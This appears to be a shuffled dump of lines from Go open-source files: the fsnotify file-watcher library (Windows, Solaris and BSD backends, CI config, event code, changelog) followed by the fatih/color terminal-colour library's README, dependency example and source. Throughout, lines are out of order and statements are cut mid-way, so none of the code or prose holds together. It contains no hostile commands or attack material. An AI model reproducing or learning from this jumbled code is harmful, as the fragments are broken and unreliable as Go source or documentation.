"w.Events <- newEvent("""", sysFSQOVERFLOW)"
sysFSMOVEDFROM == sysFSMOVEDFROM {
sysFSATTRIB != 0 {
case syscall.ERROR_OPERATION_ABORTED:
Watcher) Close() error {
"return nil, os.NewSyscallError(""GetFileInformationByHandle"", e)"
sysFSDELETESELF = 0x400
return i[ino.index]
"for _, index := range indexes {"
i[ino.index] = watch
watchEntry := w.watches.get(ino)
"for _, m := range watch.names {"
"if w.sendEvent(fullname, watch.mask"
mask = sysFSDELETESELF
"w.Errors <- errors.New(""ERROR_MORE_DATA has unexpectedly null lpOverlapped buffer"")"
"// readEvents reads from the I/O completion port, converts the"
case nil:
"fullname = filepath.Join(watch.path, watch.rename)"
quit     chan chan<- error
flags 
sysFSATTRIB     = 0x4
in.reply <- w.remWatch(in.path)
"dir, _ = filepath.Split(pathname)"
"reply: make(chan error),"
w.isClosed = true
sysFSMODIFY == sysFSMODIFY {
if mask == 0 {
isClosed bool           // Set to true when Close() is first called
"Watcher) sendEvent(name string, mask uint64) bool {"
"for _, index := range w.watches {"
"names: make(map[string]uint64),"
if i := m[ino.volume]
"inode, err error) {"
"return ino, nil"
toFSnotifyFlags(raw.Action)) {
"return nil, os.NewSyscallError(""CreateFile"", e)"
flags uint32
if w.isClosed {
"""sync"""
type indexMap map[uint64]
mask = sysFSMODIFY
"for name, mask := range watch.names {"
= Chmod
// Entry point to the I/O thread.
"event := newEvent(name, uint32(mask))"
= Remove
watch := (
"path:  dir,"
if err := w.startRead(watch)
return <-ch
e.Op 
func (m watchMap) set(ino 
= flags
"e := syscall.ReadDirectoryChanges(watch.ino.handle, "
Watcher) wakeupReader() error {
if watch.names[watch.rename] != 0 {
rename string            // Remembers the old name while renaming a file
return nil
return sysFSMOVEDFROM
type inode struct {
input    // Inputs to the reader are sent on this channel
"if _, e := syscall.CreateIoCompletionPort(ino.handle, w.port, 0, 0)"
return sysFSCREATE
"err := os.NewSyscallError(""ReadDirectoryChanges"", e)"
name := syscall.UTF16ToString(buf[:raw.FileNameLength/2])
var fi syscall.ByHandleFileInformation
func (w 
"dir, err := getDir(pathname)"
Watcher) readEvents() {
sysFSQOVERFLOW = 0x4000
"Events:  make(chan Event, 50),"
"port, e := syscall.CreateIoCompletionPort(syscall.InvalidHandle, 0, 0, 0)"
ch := make(chan error)
sysFSDELETE == sysFSDELETE 
ov     syscall.Overlapped
if e := syscall.CancelIo(watch.ino.handle)
"Watcher, error) {"
type watch struct {
if watch.mask
"watches: make(watchMap),"
w.mu.Unlock()
in := 
"w.Errors <- errors.New(""Windows system assumed buffer larger than it is, events have likely been missed."")"
name := filepath.Base(pathname)
case in := <-w.input:
provisional == 0 {
sendNameEvent := func() {
if i == nil {
// In practice we can get away with just carrying on.
continue
sysFSMODIFY     = 0x2
"// Point ""raw"" to the event in the buffer"
watch
// license that can be found in the LICENSE file.
"nil, syscall.OPEN_EXISTING,"
"w.sendEvent(fullname, watch.names[name]"
sysFSONESHOT = 0x80000000
return sysFSDELETE
// Copyright 2011 The Go Authors. All rights reserved.
buf := (
"fullname := filepath.Join(watch.path, name)"
= Create
mask 
import (
"op:    opAddWatch,"
"syscall.FILE_FLAG_OVERLAPPED, 0)"
sysFSDELETE     = 0x200
"return os.NewSyscallError(""PostQueuedCompletionStatus"", e)"
case opAddWatch:
"delete(watch.names, watch.rename)"
"flags: sysFSALLEVENTS,"
dir = filepath.Clean(dir)
if pathname == dir {
index:  uint64(fi.FileIndexHigh)<<32 
if watch.mask != 0 {
"attr, e := syscall.GetFileAttributes(syscall.StringToUTF16Ptr(pathname))"
= provisional
// The i/o succeeded but the buffer is full.
if n == 0 {
e := Event{Name: name}
go w.readEvents()
"input, 1),"
"volume: fi.VolumeSerialNumber,"
w.deleteWatch(watch)
provisional
sysFSMOVEDTO    = 0x80
raw.FileName))
close(w.Events)
case syscall.FILE_ACTION_REMOVED:
sysFSACCESS != 0 {
"syscall.FILE_SHARE_DELETE,"
"h, e := syscall.CreateFile(syscall.StringToUTF16Ptr(path),"
 e != nil {
return
"uint32(unsafe.Sizeof(watch.buf)), false, mask, nil, "
reply chan error
"return errors.New(""watcher already closed"")"
var offset uint32
sysFSIGNORED)
func toFSnotifyFlags(action uint32) uint64 {
Watcher{
"ino, err := getIno(dir)"
"Watcher, error) {"
import (
"// Watcher watches a set of files, delivering events to a channel."
// NewWatcher establishes a new watcher with the underlying OS and begins waiting for events.
// Close removes all watches and closes the events channel.
"return nil, errors.New(""FEN based watcher not yet supported for fsnotify"
Events chan Event
return nil
type Watcher struct {
// Copyright 2010 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
func NewWatcher() (
package fsnotify
Watcher) Add(name string) error {
// Remove stops watching the the named file or directory (non-recursively).
// license that can be found in the LICENSE file.
// Add starts watching the named file or directory (non-recursively).
func (w 
"""errors"""
Errors chan error
Watcher) Remove(name string) error {
build solaris
Watcher) Close() error {
const openMode = unix.O_NONBLOCK 
build freebsd openbsd netbsd dragonfly
// Use of this source code is governed by a BSD-style
package fsnotify
"import ""golang.org/x/sys/unix"""
// license that can be found in the LICENSE file.
// Copyright 2013 The Go Authors. All rights reserved.
 unix.O_RDONLY
script:
language: go
sudo: false
matrix:
  - linux
  - osx
" tee /dev/stderr)"""
"  - test -z ""$(gofmt -s -l -w . "
  - go vet ./...
  email: false
  - tip
"  - test -z ""$(golint ./...     "
notifications:
  - 1.9.x
before_script:
    - go: tip
  allow_failures:
  - go get -u github.com/golang/lint/golint
  - 1.8.x
after_script:
  fast_finish: true
  - go test -v --race ./...
"CHMOD"")"
"""fmt"""
// Use a buffer for efficient string concatenation
// Event represents a single file system notification.
import (
Chmod == Chmod {
type Event struct {
var buffer bytes.Buffer
// Common errors that can be reported by a watcher
if buffer.Len() == 0 {
// Copyright 2012 The Go Authors. All rights reserved.
Write == Write {
// String returns a string representation of the event in the form
Name string // Relative path to the file or directory.
"return """""
"..."""
Create Op = 1 << iota
Chmod
func (op Op) String() string {
Create == Create {
Op   Op     // File operation that triggered the event.
"REMOVE"")"
Rename == Rename {
Write
"buffer.WriteString("""
type Op uint32
Remove == Remove {
return buffer.String()[1:] // Strip leading pipe
"RENAME"")"
"CREATE"")"
"""bytes"""
// These are the generalized file operations that can trigger a notification.
// Use of this source code is governed by a BSD-style
package fsnotify
WRITE
// license that can be found in the LICENSE file.
Remove
// Op describes a set of file operations.
if op
build !plan9
Rename
"return fmt.Sprintf(""%q: %s"", e.Name, e.Op.String())"
"""errors"""
"var ErrEventOverflow = errors.New(""fsnotify queue overflow"")"
"WRITE"")"
func (e Event) String() string {
// Package fsnotify provides a platform-independent interface for file system notifications.
"// ""file: REMOVE"
const (
 v1.2.5 / 2015-10-17
177](https://github.com/fsnotify/fsnotify/pull/177) (thanks @pattyshack)
33][] (reported by @nbkolchin)
" [API] Remove AddWatch on Windows, use Add."
 v1.2.9 / 2016-01-13
 [API] Op constants replace methods like IsCreate().
 v0.8.10 / 2013-10-19
 v0.7.2 / 2012-09-01
 Moved to [github.com/fsnotify/fsnotify](https://github.com/fsnotify/fsnotify).
13](https://github.com/fsnotify/fsnotify/issues/13)
 v0.7.0 / 2012-07-02
63](https://github.com/fsnotify/fsnotify/pull/63) (thanks @PieterD)
 v1.1.1 / 2015-02-05
 kqueue: directory watching improvements (thanks @vmirage)
63]: https://github.com/howeyc/fsnotify/issues/63
 [Fix] tests on Windows
98](https://github.com/howeyc/fsnotify/pull/98)
 [Fix] inoitfy/kqueue memory leak [
IN_MOVED_TO
 inotify: fix race in test
 [Fix] kqueue: watch with an existing folder inside the watched folder (thanks @vmirage)
 inotify: ignore 
 [API] Renamed FileEvent struct to Event.
 [Fix] inotify: ignore event changes
 v0.9.3 / 2014-12-31
code.google.com/p/go.exp/fsnotify
 initial commit
 v1.1.0 / 2014-12-12
1][] (thanks @davecheney)
 [API] Remove FD_SET and friends from Linux adapter
 Linux: use InotifyInit1 with IN_CLOEXEC to stop leaking a file descriptor to a child process when using fork/exec [
 v0.8.7 / 2013-06-03
63][] (thanks @paulhammond)
/c/21971/) x/sys/unix and switching to to it from syscall (thanks @suihkulokki) [
 v0.2.0 / 2011-12-30
51](https://github.com/fsnotify/fsnotify/issues/51)
 kqueue: add files when watch directory
" kqueue: close kqueue after removing watches, fixes ["
 Update example to demonstrate usage of Op.
 [NOTICE] Development has moved to 
 event String()
 Support linux/arm64 by [patching](https://go-review.googlesource.com/
 [internal] remove internal watch and removeWatch methods.
 current implementation doesn't take advantage of OS for efficiency
100](https://github.com/fsnotify/fsnotify/pull/100) (thanks @suihkulokki)
59]: https://github.com/howeyc/fsnotify/issues/59
 kqueue: rework internals [
 v0.8.1 / 2013-01-09
 [Fix] kqueue: fix deadlock [
" Linux: Watch.Add improvements (avoid race, fix consistency, reduce garbage) (thanks @twpayne)"
 kqueue: don't watch named pipes [
60][]
73](https://github.com/fsnotify/fsnotify/pull/73) (thanks @chamaken)
 Add done channel to example code. [
72]: https://github.com/howeyc/fsnotify/issues/72
 [Doc] Cross-platform testing with Vagrant  [
83](https://github.com/fsnotify/fsnotify/pull/83) (thanks @guotie)
 in preparation for inclusion in the Go standard library.
 kqueue: fix race condition in Close [
 [Fix] Windows: handle 
 v0.9.1 / 2014-06-12
 kqueue: avoid infinite loops from symlinks cycles [
 v1.0.0 / 2014-08-15
 Improve documentation for exported identifiers. [
 Tests: Fix missing verb on format string (thanks @rchiossi)
Event.
 [internal] remove cookie from Event struct (unused).
43](https://github.com/fsnotify/fsnotify/pull/43)
DELETE_SELF
 Go 1 released: build with go tool
 v0.8.12 / 2013-11-13
 v1.2.10 / 2016-03-02
 [Doc] GoCI badge in README (Linux only) [
 v0.7.3 / 2012-09-27
 less mutexes [
 [Doc] Add Changelog [
62][] (reported by @paulhammond)
 dev / 2014-06-12
24][] (reported by @jakerr)
 Linux: Properly handle inotify's IN_Q_OVERFLOW event (thanks @zeldovich)
 [Doc] update package path in example code [
105](https://github.com/fsnotify/fsnotify/pull/105) (thanks @djui for reporting the issue and @ppknap for writing a failing test)
111](https://github.com/fsnotify/fsnotify/pull/111) (thanks @bep)
36](https://github.com/fsnotify/fsnotify/issues/36)
40][] (thanks @ChrisBuchholz)
 kqueue: create file event
 update to latest Go weekly code
70][] (reported by @bernerdschaefer)
45][] (reported by @srid)
121](https://github.com/fsnotify/fsnotify/pull/121) (thanks @tiffanyfj)
 (requested by @taralx)
 v0.8.9 / 2013-09-08
 [API] Don't set the Write Op for attribute notifications [
 lower case error messages
93](https://github.com/howeyc/fsnotify/issues/93
 kqueue: cleanup internal watch before sending remove event [
 dev / 2014-06-21
 [Fix] kqueue: race between Close and readEvents [
 [Doc] Spotlight and double modify events on macOS [
 v0.8.3 / 2013-03-13
 v0.9.2 / 2014-08-17
 v0.8.5 / 2013-05-09
 [Fix] Missing create events on macOS. [
 add a String() method to Event.Op [
 [Fix] for renaming files
 v0.5.0 / 2012-05-03
 BSD/macOS: Fix possible deadlock on closing the watcher on kqueue (thanks @nhooyr and @glycerine)
37](https://github.com/fsnotify/fsnotify/pull/37) (thanks @chenyukang)
 IsAttrib() for events that only concern a file's metadata [
" provides little benefit over filtering events as they are received, but has  extra bookkeeping and mutexes"
25][] (requested by @cpisto)
178](https://github.com/fsnotify/fsnotify/pull/178) (thanks @pattyshack)
4](https://github.com/fsnotify/fsnotify/issues/4)
 [Fix] kqueue: remove file watches when parent directory is removed [
 not fully implemented on Windows [
29]: https://github.com/howeyc/fsnotify/issues/29
 inotify: use epoll_create1 for arm64 support (requires Linux 2.6.27 or later) [
 v1.0.3 / 2014-08-19
 v0.3.0 / 2012-02-19
 [Feature] Windows support using winfsnotify
66](https://github.com/fsnotify/fsnotify/pull/66) (thanks @PieterD)
 v1.0.4 / 2014-09-07
 Linux: Fix deadlock in Remove (thanks @aarondl)
" Rename source code files, rearrange code so exported APIs are at the top."
 inotify: closing watcher should now always shut down goroutine [
36][] (reported by @nbkolchin)
72][] (thanks @nathany)
 [Doc] add Authors
 [Fix] kqueue: watch the directory even if it isn't a new watch (thanks @robfig)
 [Fix] inotify: remove all watches before Close()
 inotify: add 
 [API] Make syscall flags internal
 only need to store flags on directories
 v1.3.1 / 2016-06-28
 Go 1.3
165](https://github.com/fsnotify/fsnotify/pull/165) (thanks @oozie)
30](https://github.com/fsnotify/fsnotify/issues/30)
61](https://github.com/fsnotify/fsnotify/issues/61) (thanks @PieterD)
 Fix for String() method on Event (thanks Alex Brainman)
 Fix flaky inotify stress test on Linux [
14](https://github.com/fsnotify/fsnotify/issues/14) (thanks @zhsso)
77]: https://github.com/howeyc/fsnotify/pull/77
 v0.7.4 / 2012-10-09
 [Fix] inotify: fixes from https://codereview.appspot.com/5418045/ (ugorji)
 [Fix] Windows MOVED_TO now translates to Create like on BSD and Linux. [
 [API] Pluralized channel names: Events and Errors.
 inotify: use epoll to wake up readEvents [
 v0.4.0 / 2012-03-30
 v1.0.2 / 2014-08-17
 v1.4.0 / 2016-10-01
 Windows: fix for double backslash when watching the root of a drive [
 dev / 2014-07-09
 kqueue: watch for rename events on subdirectories [
 v1.4.7 / 2018-01-09
 done can be an unbuffered channel
 [internal] Event struct has the same definition across every OS.
" enable race detection for continuous integration (Linux, Mac, Windows)"
 [internal] use syscall constants directly for inotify and kqueue.
 Events channel of type Event rather than 
 v0.8.6 / 2013-05-23
 Changelog
 v0.8.4 / 2013-04-07
 linux: common FileEvent functions
36]: https://github.com/howeyc/fsnotify/issues/36
 kqueue: fix regression in  rework causing subdirectories to be watched [
 kqueue: fix incorrect mutex used in Close()
 [Fix] kqueue: watch all file events [
 kqueue: add watch on file creation to match inotify
33]: https://github.com/howeyc/fsnotify/issues/33
 [API] Renamed Watch() to Add() and RemoveWatch() to Remove().
 Roll attribute notifications into IsModify
151](https://github.com/fsnotify/fsnotify/issues/151) (thanks @brunoqc)
 v1.2.1 / 2015-10-14
 kqueue: add dragonfly to the build tags.
49]: https://github.com/howeyc/fsnotify/issues/49
45]: https://github.com/howeyc/fsnotify/issues/45
40]: https://github.com/howeyc/fsnotify/issues/40
 [Doc] Godoc example [
49][] (thanks @jbowtie)
 kqueue: match symlink behavior on Linux
 v0.6.0 / 2012-06-06
 Use os.NewSyscallError instead of returning errno (thanks @hariharan-uno)
 [internal] kqueue: rename events to kevents and fileEvent to event.
 v0.8.11 / 2013-11-02
 [Fix] kqueue: preserve watch flags when watching for delete [
 add low-level functions
52](https://github.com/fsnotify/fsnotify/pull/52) (thanks @mdlayher)
48](https://github.com/fsnotify/fsnotify/issues/48)
 v1.4.2 / 2016-10-10
 v1.2.8 / 2015-12-17
25]: https://github.com/howeyc/fsnotify/issues/25
 Windows does not have attribute change notifications
 [Fix] inotify: Added file name back to event path
21][] (reported by @robfig)
29][] (thanks @fsouza)
60]: https://github.com/howeyc/fsnotify/issues/60
 [Fix] race in symlink test [
 v0.7.1 / 2012-07-14
 v0.1.0 / 2011-10-19
 dev / 2014-06-28
77][] (thanks @cespare)
 no tests for the current implementation
 Fix data race on kevent buffer (thanks @tilaks) [
 v0.9.0 / 2014-01-17
 dev / 2014-06-19
ERROR_MORE_DATA
 [Doc] Contributing (thanks @nathany)
 [Fix] Windows path separators
 [Fix] fix data races for map access [
issuecomment-39285195)
 on Windows [
79]: https://github.com/howeyc/fsnotify/pull/79
 events
 v0.8.2 / 2013-02-07
 kqueue: events for created directories
71][] (reported by @mdwhatcott)
 inotify: Retry read on EINTR [
59][] (thanks @nathany)
 Docs: replace references to OS X with macOS
 inotify: fix path leaks [
 dev / 2014-05-23
135](https://github.com/fsnotify/fsnotify/pull/135)
kqueue: Fix logic for CREATE after REMOVE [
 [API] kqueue: return errors during watch instead of sending over channel
 dev / 2014-07-04
 [Fix] kqueue: deleting watched directory [
IN_IGNORED
21]: https://github.com/howeyc/fsnotify/issues/21
98](https://github.com/fsnotify/fsnotify/pull/98) (thanks @evanphx)
 Docs: Moved FAQ into the README (thanks @vahe)
 v0.8.0 / 2012-11-09
 kqueue: watch files after directory created (thanks @tmc)
 [Doc] specify OS-specific limits in README (thanks @debrando)
 v0.8.8 / 2013-06-17
 kqueue: Use EVT_ONLY flag on Darwin
24]: https://github.com/howeyc/fsnotify/issues/24
 [Doc] BSD License
 More efficient string concatenation for Event.String() [
 [Feature] FSNotify flags
 required on Windows (uses syscall.ERROR_MORE_DATA internally).
 [Fix] kqueue: no longer get duplicate CREATE events
 [Fix] kqueue: use fsnFlags for watching a directory [
59](https://github.com/fsnotify/fsnotify/issues/59)
 remove calls to os.NewSyscallError
 v0.5.1 / 2012-05-22
 [Fix] Make ./path and path equivalent. (thanks @zhsso)
62]: https://github.com/howeyc/fsnotify/issues/62
 [Doc] Update README with full example
 Fix golint errors in windows.go [
79][] (thanks @abustany)
71]: https://github.com/howeyc/fsnotify/issues/71
70]: https://github.com/howeyc/fsnotify/issues/70
 [Fix] kqueue: handle EINTR (reported by @robfig)
 [API] Remove current implementation of WatchFlags.
 v1.4.1 / 2016-10-04
    
 [Backport] Fix missing create events on macOS. [
 [Fix] kqueue: modify after recreation of file
" [Fix] inotify: allow monitoring of ""broken"" symlinks (thanks @tsg)"
 Don't build on Plan 9 or Solaris (thanks @4ad)
 Minor updates based on feedback from golint.
 v1.3.0 / 2016-04-19
101](https://github.com/fsnotify/fsnotify/pull/101) (thanks @illicitonion)
 v1.2.0 / 2015-02-08
go get github.com/fatih/color
(for example if the output were piped directly to 
less
"info := color.New(color.FgWhite, color.BgGreen).SprintFunc()"
bash
// Use helper functions
"color.Cyan(""Prints text in cyan."")"
 Color [![GoDoc](https://godoc.org/github.com/fatih/color
c.DisableColor()
"n"", info(""package""))"
disable/enable color output on the fly:
 Examples
Colors) in Go (Golang). It
"n"", color.GreenString(""Info:""), ""an important message."")"
"c.Println(""This prints again cyan..."")"
 has support to disable/enable colors both globally and for single color 
vendor
// Create a new color object
// Windows supported too! Just don't forget to change the output to color.Output
"success := color.New(color.Bold, color.FgGreen).FprintlnFunc()"
"d.Printf(""This prints bold cyan %s"
"notice := color.New(color.Bold, color.FgGreen).PrintlnFunc()"
"success(myWriter, ""Don't forget this..."")"
defer color.Unset() // Use it in your function
red := color.New(color.FgRed).SprintFunc()
"notice(""Don't forget this..."")"
blue := color.New(FgBlue).FprintfFunc()
"fmt.Fprintf(color.Output, ""Windows support: %s"", color.GreenString(""PASS""))"
// Or just add them to New()
// Print with default helper functions
 Todo
"red(""Warning"")"
// A newline will be appended automatically
 folder is here for stability. Remove the folder if you
already have the dependencies in your GOPATH.
"d := color.New(color.FgCyan, color.Bold)"
"blue.Fprint(writer, ""This will print text in blue."")"
// Create SprintXxx functions to mix strings with other non-colorized strings:
"n"", ""too!."")"
"var flagNoColor = flag.Bool(""no-color"", false, ""Disable color output"")"
 Credits
color.NoColor = true // disables colorized output
 Evaluate fmt.Formatter interface
// Use your own io.Writer output
 Save/Return previous values
"red(""Error: %s"", err)"
red := color.New(color.FgRed).PrintfFunc()
It also has support for single color definitions (local). You can
"c.Println(""Prints cyan text"")"
color.Set(color.FgYellow)
 bool flag. You 
definitions. For example suppose you have a CLI app and a 
 Windows support via @mattn: [colorable](https://github.com/mattn/go-colorable)
 [Fatih Arslan](https://github.com/fatih)
c := color.New(color.FgCyan).Add(color.Underline)
blue := color.New(color.FgBlue)
 Insert into noncolor strings (SprintFunc)
Note that the 
"n"", yellow(""warning""), red(""error""))"
 Mix and reuse colors
LICENSE.md
go-isatty
There might be a case where you want to explicitly disable/enable color output. the 
 Install
![Color](https://i.imgur.com/c1JI0lA.png)
"color.Set(color.FgMagenta, color.Bold)"
// You can mix up parameters
"whiteBackground.Println(""Red text with white background."")"
 Disable/Enable color
 package will automatically disable color output for non-tty output streams 
// Mix up multiple attributes
Color lets you use colorized outputs in terms of [ANSI Escape
// Use handy standard colors
 Custom fprint functions (FprintFunc)
 License
c := color.New(color.FgCyan)
"has support for Windows too! The API can be used in several ways, pick one that"
// Mix up with multiple attributes
"fmt.Printf(""%v %v"
// Create a custom print function for convenience
Color
"fmt.Printf(""This one %s"
"color.Red(""We have red"")"
 Plug into existing code
// These are using the default foreground colors
 Use your own output (io.Writer)
flagNoColor {
"n"", ""too"")"
"// Mix up foreground and background colors, create new mixes!"
"boldRed.Println(""This will print text in bold red."")"
"fmt.Printf(""This is a %s and this is %s."
The MIT License (MIT) - see [
yellow := color.New(color.FgYellow).SprintFunc()
"fmt.Println(""Existing text will now be in yellow"")"
"fmt.Println(""This"", color.RedString(""warning""), ""should be not neglected."")"
"c.Println(""This is printed without any color"")"
whiteBackground := red.Add(color.BgWhite)
"c.Println(""Prints cyan text with an underline."")"
style=flat-square)](https://travis-ci.org/fatih/color)
color.Unset() // Don't forget to unset
red := color.New(color.FgRed)
--no-color
status.svg)](https://godoc.org/github.com/fatih/color) [![Build Status](https://img.shields.io/travis/fatih/color.svg
"color.New(color.FgBlue).Fprintln(myWriter, ""blue color!"")"
boldRed := red.Add(color.Bold)
c.EnableColor()
can easily disable the color output with:
"fmt.Println(""All text will now be bold magenta."")"
 Standard colors
suits you.
"color.Blue(""Prints %s in blue."", ""text"")"
 Custom print functions (PrintFunc)
](https://github.com/fatih/color/blob/master/LICENSE.md) for more details
Codes](http://en.wikipedia.org/wiki/ANSI_escape_code
"blue(myWriter, ""important notice: %s"", stars)"
"color.Magenta(""And many others .."")"
"fmt.Printf(""This %s rocks!"
"   version = ""1.0.0"""
"   name = ""github.com/user/project"""
"  name = ""github.com/mattn/go-colorable"""
 Refer to https://github.com/golang/dep/blob/master/docs/Gopkg.toml.md
 Gopkg.toml example
"  version = ""0.0.9"""
"   name = ""github.com/user/project2"""
" required = [""github.com/user/thing/cmd/thing""]"
" ignored = [""github.com/user/project/pkgX"", ""bitbucket.org/user/project/pkgA/pkgY""]"
"  version = ""2.4.0"""
"  version = ""0.0.3"""
 [[override]]
"   source = ""github.com/myfork/project2"""
"   branch = ""dev"""
"  name = ""github.com/mattn/go-isatty"""
"  name = ""github.com/x/y"""
[[constraint]]
 [[constraint]]
 for detailed Gopkg.toml documentation.
// Foreground text colors
// Unset resets all escape attributes and clears the output. Usually should
// be called after Set().
// Black is a convenient helper function to print with black foreground. A
FgGreen
"func WhiteString(format string, a ...interface{}) string { return colorString(format, FgWhite, a...) }"
if c.noColor != nil {
"""os"""
// color.
c.Print(a...)
BgHiRed
// wrap wraps the s string with the colors attributes. The string is ready to
Color) Set() 
// code and still being able to output. Can be used for flags like
ReverseVideo
// HiBlackString is a convenient helper function to return a string with hi-intensity black
"Color) FprintlnFunc() func(w io.Writer, a ...interface{}) {"
"return colorString(format, FgMagenta, a...)"
FgHiCyan
"Color) SprintfFunc() func(format string, a ...interface{}) string {"
"func BlueString(format string, a ...interface{}) string { return colorString(format, FgBlue, a...) }"
"Color{params: make([]Attribute, 0)}"
// colorized with color.Print().
"c, ok := colorsCache[p]"
if c.isNoColorSet() {
"func colorString(format string, p Attribute, a ...interface{}) string {"
c.Set()
"return func(format string, a ...interface{}) {"
return c.wrap(fmt.Sprintln(a...))
"// Sprint is just like Print, but returns a string instead of printing it."
format[i] = strconv.Itoa(int(v))
// string. Windows users should use this in conjunction with color.Output.
"Color) PrintfFunc() func(format string, a ...interface{}) {"
"c.Fprintf(w, format, a...)"
BgBlue
Color) bool {
} else {
return c
// PrintlnFunc returns a new function that prints the passed arguments as
"func YellowString(format string, a ...interface{}) string { return colorString(format, FgYellow, a...) }"
return true
"c.params = append(c.params, value...)"
"return colorString(format, FgHiWhite, a...)"
// HiRedString is a convenient helper function to return a string with hi-intensity red
Color) isNoColorSet() bool {
"Color) Println(a ...interface{}) (n int, err error) {"
BgHiWhite
// MagentaString is a convenient helper function to return a string with magenta
// FprintlnFunc returns a new function that prints the passed arguments as
c.noColor = boolPtr(true)
Color) PrintFunc() func(a ...interface{}) {
"for _, attr := range c.params {"
"func Red(format string, a ...interface{}) { colorPrint(format, FgRed, a...) }"
// Set sets the given parameters immediately. It will change the color of
"func White(format string, a ...interface{}) { colorPrint(format, FgWhite, a...) }"
// DisableColor disables the color output. Useful to not change any existing
// Set sets the SGR sequence.
// Yellow is a convenient helper function to print with yellow foreground.
// Print formats using the default formats for its operands and writes to
"return fmt.Sprintf(""%s[%sm"", escape, c.sequence())"
return false
FgHiGreen
return NoColor
"func HiWhiteString(format string, a ...interface{}) string {"
"""io"""
BgHiBlack Attribute = iota 
noColor 
"""github.com/mattn/go-colorable"""
return func(a ...interface{}) string {
// BlackString is a convenient helper function to return a string with black
 !isatty.IsCygwinTerminal(os.Stdout.Fd()))
"Color) FprintFunc() func(w io.Writer, a ...interface{}) {"
c.noColor
Color) unset() {
(!isatty.IsTerminal(os.Stdout.Fd()) 
var (
// check first if we have user setted action
Faint
"// ""--no-color"". To enable back use EnableColor() method."
// Color defines a custom color object which is defined by SGR parameters.
CrossedOut
Color) sequence() string {
BgHiGreen
Reset Attribute = iota
// Spaces are added between operands when neither is a string.
put := New(FgYellow).SprintFunc()
colorsCache   = make(map[Attribute]
Color) Sprintln(a ...interface{}) string {
// colorized with color.Println().
// Base attributes
c := 
// HiRed is a convenient helper function to print with hi-intensity red foreground. A
c.Print(format)
// Output defines the standard output of the print functions. By default
Italic
// New returns a newly created color object.
"fmt.Fprintf(color.Output, ""This is a %s"", put(""warning""))"
// FprintfFunc returns a new function that prints the passed arguments as
FgBlue
BgHiYellow
"""strconv"""
"for i, v := range c.params {"
c := getCachedColor(p)
BgYellow
"""strings"""
"return func(w io.Writer, a ...interface{}) {"
c.noColor = boolPtr(false)
Color) DisableColor() {
// WhiteString is a convenient helper function to return a string with white
// HiBlue is a convenient helper function to print with hi-intensity blue foreground. A
"fmt.Fprintf(w, c.format())"
"return fmt.Sprintf(""%s[%dm"", escape, Reset)"
"func HiGreen(format string, a ...interface{}) { colorPrint(format, FgHiGreen, a...) }"
"func HiRedString(format string, a ...interface{}) string { return colorString(format, FgHiRed, a...) }"
type Color struct {
bool {
Color) Add(value ...Attribute) 
"// string. Windows users should use this in conjunction with color.Output, example:"
"return colorString(format, FgHiMagenta, a...)"
// colorized with color.Printf().
c.Println(a...)
"// and create custom color objects. Example: Add(color.FgRed, color.Underline)."
if !c2.attrExists(attr) {
 c.unformat()
"""fmt"""
"return c.wrap(fmt.Sprintf(format, a...))"
return s
Concealed
// HiBlueString is a convenient helper function to return a string with hi-intensity blue
BgBlack Attribute = iota 
// DisableColor(). Otherwise this method has no side effects.
// appended. It returns the number of bytes written and any write error
"// sequence returns a formatted SGR sequence to be plugged into a """
c = New(p)
FgWhite
"func CyanString(format string, a ...interface{}) string { return colorString(format, FgCyan, a...) }"
Color) wrap(s string) string {
// YellowString is a convenient helper function to return a string with yellow
FgBlack Attribute = iota 
// HiMagentaString is a convenient helper function to return a string with hi-intensity magenta
type Attribute int
BgHiBlue
"return colorString(format, FgHiBlack, a...)"
"Color) Fprintln(w io.Writer, a ...interface{}) (n int, err error) {"
"return fmt.Fprint(Output, a...)"
if attr == a {
c.params[0] = value
"func GreenString(format string, a ...interface{}) string { return colorString(format, FgGreen, a...) }"
BgCyan
// HiCyanString is a convenient helper function to return a string with hi-intensity cyan
// This is the standard fmt.Printf() method wrapped with the given color.
// or not. This is a global option and affects all colors. For more control
return 
format 
// HiMagenta is a convenient helper function to print with hi-intensity magenta foreground.
"func HiYellowString(format string, a ...interface{}) string {"
c.Add(value...)
// over each color block use the methods DisableColor() individually.
"NoColor = os.Getenv(""TERM"") == ""dumb"" "
"return func(w io.Writer, format string, a ...interface{}) {"
FgHiWhite
return func(a ...interface{}) {
// Error defines a color supporting writer for os.Stderr.
Color {
"36"" -> bold cyan"
"func HiBlue(format string, a ...interface{}) { colorPrint(format, FgHiBlue, a...) }"
// HiCyan is a convenient helper function to print with hi-intensity cyan foreground. A
defer c.unsetWriter(w)
// EnableColor enables the color output. Use it in conjunction with
// BlueString is a convenient helper function to return a string with blue
const (
FgRed
"n"") {"
// colorized with color.Fprintln().
Underline
// Spaces are always added between operands and a newline is appended.
BlinkSlow
// allows to reuse already created objects with required Attribute.
// HiWhiteString is a convenient helper function to return a string with hi-intensity white
// os.Stdout is used.
"func HiYellow(format string, a ...interface{}) { colorPrint(format, FgHiYellow, a...) }"
Color) format() string {
"fmt.Fprintf(Output, ""%s[%dm"", escape, Reset)"
if !ok {
// SprintFunc returns a new function that returns colorized strings for the
"func HiBlueString(format string, a ...interface{}) string { return colorString(format, FgHiBlue, a...) }"
BgGreen
colorsCache[p] = c
// colorized with color.Fprintf().
// RedString is a convenient helper function to return a string with red
FgHiYellow
FgHiBlue
Color) setWriter(w io.Writer) 
// HiGreenString is a convenient helper function to return a string with hi-intensity green
// It returns the number of bytes written and any write error encountered.
// Background text colors
// HiYellowString is a convenient helper function to return a string with hi-intensity yellow
// HiGreen is a convenient helper function to print with hi-intensity green foreground. A
"Color) Printf(format string, a ...interface{}) (n int, err error) {"
c.setWriter(w)
// Background Hi-Intensity text colors
"// Sprintln is just like Println, but returns a string instead of printing it."
"Color) Fprintf(w io.Writer, format string, a ...interface{}) (n int, err error) {"
// Fprintf formats according to a format specifier and writes to w.
FgHiRed
"Color) Fprint(w io.Writer, a ...interface{}) (n int, err error) {"
Color) prepend(value Attribute) {
// GreenString is a convenient helper function to return a string with green
// standard output. Spaces are added between operands when neither is a
// type 
"Color) FprintfFunc() func(w io.Writer, format string, a ...interface{}) {"
// be printed.
FgCyan
BgRed
return c.SprintFunc()(format)
// SprintlnFunc returns a new function that returns colorized strings for the
BgMagenta
// given arguments with fmt.Sprintln(). Useful to put into or mix into other
"Color) Sprintf(format string, a ...interface{}) string {"
"// Sprintf is just like Printf, but returns a string instead of printing it."
// newline is appended to format by default.
"func Cyan(format string, a ...interface{}) { colorPrint(format, FgCyan, a...) }"
